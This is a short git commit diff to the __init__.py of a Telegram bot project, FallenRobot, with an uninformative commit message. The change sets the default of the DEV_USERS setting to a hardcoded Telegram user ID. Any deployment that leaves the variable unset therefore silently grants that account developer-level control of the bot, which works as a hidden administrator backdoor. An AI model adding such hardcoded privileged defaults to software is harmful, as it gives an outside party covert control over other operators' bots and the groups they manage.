7af4e60169e19967708fd26acbe5570080caec98
petinggint <155607304+petinggint@users.noreply.github.com>
2025-03-06 10:45:49 +0700

    c __init__.py

--- FallenRobot/__init__.py
+++ FallenRobot/__init__.py
@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "5510539512").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
